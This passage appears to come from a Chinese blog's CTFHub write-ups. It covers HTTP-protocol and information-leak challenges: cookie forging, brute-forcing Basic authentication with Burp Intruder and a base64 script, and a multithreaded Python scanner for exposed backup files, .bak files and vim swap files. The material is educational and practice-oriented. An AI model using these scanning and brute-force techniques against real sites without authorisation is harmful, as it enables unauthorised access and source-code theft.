<p>可以看到send后是一个302的请求，所以才会被重定向</p>
<p>通过查询，还有另一种方式就是cmd命令里的curl命令</p>
<p>在cmd中</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v http://challenge-62083e00fdc21e52.sandbox.ctfhub.com:10800/index.php</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>注意是原本的网页.php</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205703202.png"
                      alt="image-20240915205703202"
                ></p>
<p>然后就会返回原本的文件头，而不会被浏览器解析</p>
<p><a class="link"   href="https://blog.csdn.net/u013514928/article/details/102810250" >curl命令用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></div><div class="tab-pane" id="web前置技能-http协议-3"><h3 id="题目-Cookie"><a href="#题目-Cookie" class="headerlink" title="题目-Cookie"></a>题目-Cookie</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>Cookie欺骗、认证、伪造</p>

  </div>

<p>打开靶场看到提示只有<code>admin</code>能够拿到flag，再根据题目是cookie的伪造，所以这道题从cookie下手</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005118438.png"
                      alt="image-20240916005118438"
                ></p>
<p>用BP抓包看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005704097.png"
                      alt="image-20240916005704097"
                ></p>
<p>很明显的看到cookie里面的admin为0，那把它改为1不就成了吗，恭喜，这道题你做出来了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005755371.png"
                      alt="image-20240916005755371"
                ></p></div><div class="tab-pane" id="web前置技能-http协议-4"><h3 id="题目-基础认证"><a href="#题目-基础认证" class="headerlink" title="题目-基础认证"></a>题目-基础认证</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a class="link"   href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81" >https://zh.wikipedia.org/wiki/HTTP基本认证 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916005910601.png"
                      alt="image-20240916005910601"
                ></p>
<p>这道题给了我们一个附件，打开附件是一串字符，加上题目可以合理推测是用基础爆破来解题</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010010509.png"
                      alt="image-20240916010010509"
                ></p>
<p>打开靶场看到有链接，直接点开会，会弹出一个验证框叫我们输入账号密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010021706.png"
                      alt="image-20240916010021706"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010747334.png"
                      alt="image-20240916010747334"
                ></p>
<p>直接抓包看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010522890.png"
                      alt="image-20240916010522890"
                ></p>
<p>然后返回包的头部有提到admin用户，所以后续猜测使用admin用户进行爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020529442.png"
                      alt="image-20240916020529442"
                ></p>
<p>里面有个<code>Authorization</code>，合理推断其值就是账号密码的加密形式，加密段的后面有<code>==</code>说明是<code>base64加密</code>，直接在线解密试试</p>
<blockquote>
<p>这里了解一下base64的加密规则，不够4个字节的用等号&#x3D;补充</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916010723083.png"
                      alt="image-20240916010723083"
                ></p>
<p>和我输入的账号密码一样，那么我们就可以开始爆破了</p>
<blockquote>
<p>后面是关于BP软件的使用，如果没有用过的可以当提前预知，之后可以慢慢学，先做了解</p>
</blockquote>
<ul>
<li>先把数据包发送到<code>intruder</code></li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011224974.png"
                      alt="image-20240916011224974"
                ></p>
<ul>
<li>先clear工具默认的爆破点位</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011343770.png"
                      alt="image-20240916011343770"
                ></p>
<ul>
<li>再选中字段添加爆破点</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011438064.png"
                      alt="image-20240916011438064"
                ></p>
<ul>
<li><p>选择sniper攻击方式，因为我们只有一个攻击点，只有密码字典，合理猜测账号是<code>admin</code></p>
<div class="note-large red">
  <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
    <p>BP攻击方式</p>

  </div>
  <div class="notel-content">
    <p>Sniper 狙击手 – 只有一个攻击点</p></li>
</ul>
<p>Battering ram 攻城锤 – 两个攻击点，但传入的爆破参数相同</p>
<p>Pitchfork 草叉 – 两个攻击点，传入两个爆破参数</p>
<p>Cluster bomb 榴霰弹 – 具备前三种攻击方式，两个攻击点，爆破参数相互乘积即第二字典被反复使用或同一字典被反复使用（适合集中爆破–不清楚哪个该是密码还是账户）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916012324649.png"
                      alt="image-20240916012324649"
                ></p>

<pre><code>&lt;/div&gt;
</code></pre>
  </div>
  
<p>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916011533984.png"
                      alt="image-20240916011533984"
                ></p>
<ul>
<li>进入payloads页面传入字典</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916012520071.png"
                      alt="image-20240916012520071"
                ></p>
<ul>
<li><p>将密码的格式粘贴在这里</p>
<details class="red" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>对于这个密码格式如何得到有多种方法 </summary>
            <div class='content'>
            <ol><li><p>用BP自带的功能，在<code>Payload Processing</code>的<code>Add</code>中的<code>Add Prefix</code>输入<code>admin:</code>，由于需要的是Base64加密，所以需要在下面对payload进行加密</p><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916021756299.png"
                      alt="image-20240916021756299"
                ></p><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916013852023.png"
                      alt="image-20240916013852023"
                ></p></li><li><p>用脚本直接一步到位，再复制到<code>paylaod settings</code></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;base64.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            line=base64.b64encode(line.encode()).decode()</span><br><span class="line">            f.write(<span class="string">f&#x27;<span class="subst">&#123;line&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div></li></ol>
            </div>
          </details>
</li>
<li><p>然后就可以开始爆破了</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916013923711.png"
                      alt="image-20240916013923711"
                ></p>
<ul>
<li>发现一个都跑不出来</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916014245240.png"
                      alt="image-20240916014245240"
                ></p>
<blockquote>
<p>网上有说是加密结果不能带有&#x3D;&#x3D;，其实并不是，只是因为在BP里面的&#x3D;会被转义而已，不要被误导了，不然你解一辈子都解不出来</p>
<p>建议去看<a class="link"   href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html" >官方的writeup <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，我是测试了半天最后去看官方的，真的服了网上的某些帖子了&#x3D;_&#x3D;</p>
</blockquote>
<ul>
<li>需要关闭下面的<code>URL-encode</code>，不然你会看到 base64 之后的 <code>=</code> 会被转成 <code>%3d</code> ，你就算爆破到天荒地老也不会出来</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/10imageslim.png"
                      alt="img"
                ></p>
<ul>
<li>再次<code>Start Attack</code>后，按 <code>Status</code> 排序，看到状态码出现<code>200</code>，即爆破成功</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020821868.png"
                      alt="image-20240916020821868"
                ></p>
<ul>
<li>可以看到下面正常返回了flag</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916020835063.png"
                      alt="image-20240916020835063"
                ></p></div><div class="tab-pane" id="web前置技能-http协议-5"><h3 id="题目-响应包源代码"><a href="#题目-响应包源代码" class="headerlink" title="题目-响应包源代码"></a>题目-响应包源代码</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>HTTP响应包源代码查看</p>

  </div>

<p>打开靶场，根据题目要求我们查看源代码，靶场打开也是空白的，那就F12（ctrl+U）大法吧</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916022546590.png"
                      alt="image-20240916022546590"
                ></p>
<p>然后就在源码里面很直白的告诉了你flag (๑•́ ₃•̀๑)  </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240916022716123.png"
                      alt="image-20240916022716123"
                ></p></div></div></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一篇主要就是关于HTTP协议的几个点，从请求方式到网页响应码，再到cookie与加密认证，最后到网页源码，这些都是之后有可能遇到的小知识点，除了BP的使用可能比较困难，其他的确实算是入门级别的，继续加油吧，后面还有更有挑战性的题等着</p>

  <div class="note p-4 mb-4 rounded-small red">
    <p>不要放弃！！！有时候一道题做一天都有可能的！！！</p>

  </div>

<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;web前置技能-&gt;HTTP协议</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>信息泄露</title>
    <url>/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86">信息泄露-目录遍历</a></p>
<p><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">信息泄露-备份文件下载</a></p>
<p><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-PHPINFO">信息泄露-PHPINFO</a></p>
<p><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2">信息泄露-Git泄露</a></p>
<p><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2">信息泄露-SVN泄露</a></p>
<p><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2">信息泄露-HG泄露</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="信息泄露-目录遍历"><a href="#信息泄露-目录遍历" class="headerlink" title="信息泄露-目录遍历"></a>信息泄露-目录遍历</h2><p>打开靶场，看到这样的页面，点进去就是一个个的目录，那我们就先试着手动找找</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914222937043.png"
                      alt="image-20240914222937043"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914223008793.png"
                      alt="image-20240914223008793"
                ></p>
<p>看着文件不多，一个一个找，然后就会在2-2里面找到flag，点开就是我们的flag了</p>
<blockquote>
<p>这里是目录不多，如果目录多的话建议用现呈的工具进行目录遍历，或者手搓一个</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914223207919.png"
                      alt="image-20240914223207919"
                ></p>
<h2 id="信息泄露-备份文件下载"><a href="#信息泄露-备份文件下载" class="headerlink" title="信息泄露-备份文件下载"></a>信息泄露-备份文件下载</h2><div class="tabs" id="tab-信息泄露-备份文件下载"><ul class="nav-tabs"><li class="tab active"><a class="#信息泄露-备份文件下载-1">题目-网站源码</a></li><li class="tab"><a class="#信息泄露-备份文件下载-2">题目-bak文件</a></li><li class="tab"><a class="#信息泄露-备份文件下载-3">题目-vim缓存</a></li><li class="tab"><a class="#信息泄露-备份文件下载-4">题目-.DS_Store</a></li></ul><div class="tab-content"><div class="tab-pane active" id="信息泄露-备份文件下载-1"><h3 id="题目-网站源码"><a href="#题目-网站源码" class="headerlink" title="题目-网站源码"></a>题目-网站源码</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>

  </div>

<p>打开靶场看到有提示网站源码的备份文件信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240916154942458.png"
                      alt="image-20240916154942458"
                ></p>
<p>而接下来就是添加网站后缀看看有哪些是被备份没删除的</p>
<p>这里提供两种办法</p>
<ol>
<li><p>自己编写脚本实现多线程访问，我提供一个自己写的脚本可以参考一下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line">url1 = <span class="string">&#x27;http://xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;2010&#x27;</span>, <span class="string">&#x27;2011&#x27;</span>, <span class="string">&#x27;2012&#x27;</span>, <span class="string">&#x27;2013&#x27;</span>, <span class="string">&#x27;2014&#x27;</span>, <span class="string">&#x27;2015&#x27;</span>, <span class="string">&#x27;2016&#x27;</span>, <span class="string">&#x27;2017&#x27;</span>, <span class="string">&#x27;2018&#x27;</span>, <span class="string">&#x27;2019&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;2020&#x27;</span>, <span class="string">&#x27;2021&#x27;</span>, <span class="string">&#x27;2022&#x27;</span>, <span class="string">&#x27;2023&#x27;</span>, <span class="string">&#x27;2024&#x27;</span>, <span class="string">&#x27;2025&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;archive&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;back&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;backups&#x27;</span>, <span class="string">&#x27;bak&#x27;</span>, <span class="string">&#x27;bbs&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;clients&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;com&#x27;</span>, <span class="string">&#x27;customers&#x27;</span>, <span class="string">&#x27;dat&#x27;</span>, <span class="string">&#x27;data&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;database&#x27;</span>, <span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;dump&#x27;</span>, <span class="string">&#x27;engine&#x27;</span>, <span class="string">&#x27;error_log&#x27;</span>, <span class="string">&#x27;faisunzip&#x27;</span>, <span class="string">&#x27;files&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;joomla&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;master&#x27;</span>, <span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;members&#x27;</span>, <span class="string">&#x27;my&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;old&#x27;</span>, <span class="string">&#x27;orders&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;store&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;users&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;vb&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>, <span class="string">&#x27;wp&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;.tgz&#x27;</span>, <span class="string">&#x27;.tar.bz2&#x27;</span>, <span class="string">&#x27;.tar&#x27;</span>, <span class="string">&#x27;.jar&#x27;</span>, <span class="string">&#x27;.war&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.bak&#x27;</span>, <span class="string">&#x27;.sql&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;.gz&#x27;</span>, <span class="string">&#x27;.sql.gz&#x27;</span>, <span class="string">&#x27;.tar.tgz&#x27;</span>]</span><br><span class="line"><span class="comment"># 定义一个函数来进行请求，并检查状态码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">file_name</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;url1&#125;</span>/<span class="subst">&#123;file_name&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>\n&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error accessing <span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多线程执行URL请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_backup_files</span>():</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> executor:  <span class="comment"># 创建50个线程</span></span><br><span class="line">        <span class="comment"># 构造所有的文件名并提交给线程池</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">                back = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span>&quot;</span>  <span class="comment"># 组合文件名</span></span><br><span class="line">                executor.submit(check_url, back)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行扫描</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;能够访问到的网站后缀有:&quot;</span>)</span><br><span class="line">scan_backup_files()</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>用开源工具进行访问<a class="link"   href="https://github.com/VMsec/ihoneyBakFileScan_Modify" >ihoneyBakFileScan_Modify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ol>
<p>扫描完会发现能访问到<code>www.zip</code>文件，下载下来后有<code>flag文件</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917142347669.png"
                      alt="image-20240917142347669"
                ></p>
<p>直接打开没有，就在网页访问看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917142416724.png"
                      alt="image-20240917142416724"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240916155518068.png"
                      alt="image-20240916155518068"
                ></p>
<p>恭喜，访问成功！拿到flag。</p></div><div class="tab-pane" id="信息泄露-备份文件下载-2"><h3 id="题目-bak文件"><a href="#题目-bak文件" class="headerlink" title="题目-bak文件"></a>题目-bak文件</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>

  </div>

<p>打开靶场看到提示说flag文件在<code>index.php</code>中，结合题目说明这个文件被备份到<code>.bak</code>文件了，所以我们尝试访问<code>index.php.bak</code>，发现能有文件被下载，打开文件就可以看到flag了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240916160032682.png"
                      alt="image-20240916160032682"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240916160059293.png"
                      alt="image-20240916160059293"
                ></p></div><div class="tab-pane" id="信息泄露-备份文件下载-3"><h3 id="题目-vim缓存"><a href="#题目-vim缓存" class="headerlink" title="题目-vim缓存"></a>题目-vim缓存</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>

  </div>

<blockquote>
<p>vim缓存时linux里面的缓存隐藏文件</p>
</blockquote>
<p>打开靶场，根据题目和看到提示flag在index.php里面，php文件肯定以vim的形式备份了，所以我们以vim缓存文件恢复即可，所以 &#x2F;.index.php.swp 直接下载</p>
  <div class="note p-4 mb-4 rounded-small warning">
    <p>隐藏文件，记得加点访问</p>

  </div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917171052845.png"
                      alt="image-20240917171052845"
                ></p>
<blockquote>
<p>vim的备份文件后缀位.swp，并且需要用<code>vim 文件名（无.swp）</code>来重新访问，windows直接打开是16进制的，更换编码格式为UTF-8，或者用linux系统打开</p>
</blockquote>
<p>打开后就可以找到flag了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917172655327.png"
                      alt="image-20240917172655327"
                ></p></div><div class="tab-pane" id="信息泄露-备份文件下载-4"><h3 id="题目-DS-Store"><a href="#题目-DS-Store" class="headerlink" title="题目-.DS_Store"></a>题目-.DS_Store</h3>  <div class="note p-4 mb-4 rounded-small info">
